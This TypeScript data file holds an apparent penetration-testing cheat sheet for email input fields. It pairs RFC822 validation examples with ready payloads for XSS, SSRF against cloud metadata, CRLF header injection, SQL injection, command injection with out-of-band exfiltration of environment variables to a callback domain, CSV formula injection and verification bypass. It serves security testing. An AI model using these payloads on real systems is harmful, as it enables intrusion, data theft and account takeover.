export interface EmailInputCategory {
  category: string
  commands: { command: string; description: string }[]
}

export const emailInputCategories: EmailInputCategory[] = [
  {
    category: "Introduction",
    commands: [
      { command: "Email input fields are a critical attack surface — vulnerable to XSS, SSRF, header injection, SQLi, command injection, and business logic flaws. This guide covers foundational + advanced testing methodology.", description: "Complete testing methodology with practical payloads for each vulnerability type." },
    ],
  },
  {
    category: "RFC822 Email Validation Testing",
    commands: [
      { command: "simple@example.com — Valid (Standard format)", description: "#1 Standard valid email" },
      { command: "very.common@example.com — Valid (Dots in local part)", description: "#2 Dots in local part" },
      { command: 'disposable.style.email.with+symbol@example.com — Valid (Plus symbol)', description: "#3 Plus addressing" },
      { command: 'user@[192.168.1.1] — Valid (Address literal)', description: "#4 IP literal format (rare but valid)" },
      { command: '"much.more unusual"@example.com — Valid (Quoted local part)', description: "#5 Quoted local part with spaces" },
      { command: "admin@mailserver1 — Valid (Local domain, no TLD)", description: "#6 Local domain name without TLD" },
      { command: "plainaddress — Invalid (Missing @)", description: "#7 Missing @ and domain" },
      { command: "@missinglocal.org — Invalid (Missing local part)", description: "#8 Missing local part" },
      { command: "username@.com — Invalid (Leading dot in domain)", description: "#9 Leading dot" },
      { command: "username@-example.com — Invalid (Leading hyphen)", description: "#10 Leading hyphen" },
      { command: "username@example..com — Invalid (Double dot)", description: "#11 Double dot" },
      { command: "username@exam_ple.com — Invalid (Underscore in domain)", description: "#12 Underscore in domain" },
      { command: "test@examp℮.com — Invalid (Unicode in domain)", description: "#13 Unicode character in domain" },
    ],
  },
  {
    category: "RFC822 Python Validator Script",
    commands: [
      { command: 'python3 rfc822_email_validator.py  # Enter email when prompted. Returns YES/NO based on RFC822 compliance.', description: "RFC822 email validator script — test any email format against the standard (full code on GitHub)" },
      { command: "https://github.com/coffinxp/RFC822-Email-Validator", description: "GitHub repo with full RFC822 validator code" },
    ],
  },
  {
    category: "Cross-Site Scripting (XSS)",
    commands: [
      { command: '"><script>alert(1)</script>@test.com', description: "#1 Classic XSS via email field" },
      { command: '"><svg/onload=alert(3)>@test.com', description: "#2 SVG-based XSS payload" },
      { command: '"><svg/onload=confirm(1337)>"@x.y', description: "#3 XSS with confirm() in email field" },
    ],
  },
  {
    category: "Server-Side Request Forgery (SSRF)",
    commands: [
      { command: "test@your-burpcollaborator.net", description: "#1 SSRF via Burp Collaborator — monitor for outbound requests" },
      { command: "test@requestbin.net", description: "#2 Requestbin — alternative callback monitor" },
      { command: "test@127.0.0.1", description: "#3 Test localhost — may trigger internal requests" },
      { command: "test@localhost", description: "#4 Localhost SSRF test" },
      { command: "test@169.254.169.254", description: "#5 AWS/GCP/Azure metadata endpoint SSRF" },
    ],
  },
  {
    category: "Email Header Injection",
    commands: [
      { command: "test@example.com%0d%0aBCC:attacker@example.com", description: "#1 CRLF — blind CC (URL-encoded)" },
      { command: "test@example.com\\r\\nBCC:attacker@example.com", description: "#2 CRLF — blind CC (raw)" },
      { command: "test@example.com%0aCC:attacker@example.com", description: "#3 LF-only — blind CC" },
      { command: "test@example.com\\r\\nContent-Type:text/html\\r\\n\\r\\n<b>Injected</b>", description: "#4 Inject HTML content into email body" },
    ],
  },
  {
    category: "SQL Injection",
    commands: [
      { command: "test' OR '1'='1@example.com", description: "#1 SQLi with single quotes" },
      { command: "test\" OR \"1\"=\"1@example.com", description: "#2 SQLi with double quotes" },
      { command: "test@example.com'--", description: "#3 SQL comment injection" },
      { command: "test@example.com\") OR 1=1--", description: "#4 SQLi with closing parenthesis" },
    ],
  },
  {
    category: "Command Injection",
    commands: [
      { command: "test@example.com; whoami", description: "#1 Command injection with semicolon" },
      { command: "test@example.com && id", description: "#2 Command injection with AND" },
      { command: "test@example.com | uname -a", description: "#3 Command injection with pipe" },
      { command: "test@example.com`id`", description: "#4 Backtick command injection" },
      { command: "`whoami`.yourdomain.oast.fun", description: "#5 Blind command injection via OOB callback" },
      { command: "$(whoami).yourdomain.oast.fun", description: "#6 Blind command injection with $()" },
      { command: "${USER}.yourdomain.oast.fun", description: "#7 Environment variable exfiltration via OOB" },
    ],
  },
  {
    category: "Open Redirect",
    commands: [
      { command: "test@example.com%0d%0aLocation:https://evil.com", description: "#1 CRLF injection to set redirect Location header" },
      { command: "test@example.com/?next=https://evil.com", description: "#2 Open redirect via next/redirect param in email context" },
    ],
  },
  {
    category: "IDOR / User Enumeration",
    commands: [
      { command: "admin@example.com", description: "#1 Test known admin email for response differences" },
      { command: "user@example.com", description: "#2 Test known user email" },
      { command: "nonexistent@example.com", description: "#3 Compare response with nonexistent email — look for error message differences" },
    ],
  },
  {
    category: "Format / Validation Bypass",
    commands: [
      { command: '"test@evil.com"@example.com', description: "#1 Quoted email — bypasses simple validation" },
      { command: "test@subdomain..com", description: "#2 Double dot in domain" },
      { command: "test@-example.com", description: "#3 Leading hyphen in domain" },
      { command: "test@.com", description: "#4 TLD-only domain" },
      { command: "test@exam_ple.com", description: "#5 Underscore in domain" },
      { command: "test@examp℮.com", description: "#6 Unicode homoglyph in domain" },
    ],
  },
  {
    category: "CRLF Injection",
    commands: [
      { command: "test@example.com%0d%0aInjected-Header: injected", description: "#1 CRLF — inject HTTP response header" },
      { command: "test@example.com%0aInjected-Header: injected", description: "#2 LF-only — inject HTTP response header" },
    ],
  },
  {
    category: "Business Logic Abuse",
    commands: [
      { command: "Register same email multiple times — check for duplicate accounts", description: "#1 Duplicate registration — may bypass uniqueness checks" },
      { command: "Change email to another user's email — intercept verification request", description: "#2 Email takeover — change email then intercept verification" },
      { command: "Intercept and modify verification response (is_verified: false → true)", description: "#3 Response manipulation — bypass email verification" },
    ],
  },
  {
    category: "Unicode / Homograph Attacks",
    commands: [
      { command: "test@exаmple.com (Cyrillic 'а')", description: "#1 Cyrillic homoglyph — visually identical to 'a'" },
      { command: "test@examp℮.com", description: "#2 Unicode character in domain" },
    ],
  },
  {
    category: "Injection in Downstream Systems",
    commands: [
      { command: "=cmd|' /C calc'!A0", description: "#1 CSV injection — formula execution in spreadsheets" },
      { command: '"=HYPERLINK("http://evil.com")"', description: "#2 CSV injection — hyperlink payload" },
      { command: "test@example.com\\nInjectedLogEntry", description: "#3 Log injection — fake log entries" },
    ],
  },
  {
    category: "Rate Limiting & Enumeration",
    commands: [
      { command: "Automate password reset attempts with different emails → Monitor response differences", description: "#1 Enumerate valid users via response differences in password reset" },
      { command: "Automate registration attempts → Check for CAPTCHA or rate limit blocks", description: "#2 Test rate limiting on registration endpoint" },
    ],
  },
  {
    category: "Conclusion",
    commands: [
      { command: "Complete email input assessment requires testing: XSS → SSRF → Header Injection → SQLi → Command Injection → Open Redirect → IDOR → Format Bypass → CRLF → Business Logic → Unicode → CSV Injection → Rate Limiting", description: "Test all categories methodically. Email fields are a high-value attack surface." },
    ],
  },
]

export const emailInputTools = [
  { name: "RFC822 Email Validator", url: "https://github.com/coffinxp/RFC822-Email-Validator", description: "Python script to validate email addresses against RFC822 standard" },
  { name: "Burp Collaborator", url: "https://portswigger.net/burp/documentation/collaborator", description: "Out-of-band interaction detection for SSRF and blind injection testing" },
  { name: "RequestBin", url: "https://requestbin.com", description: "HTTP request inspection for SSRF and webhook testing" },
]
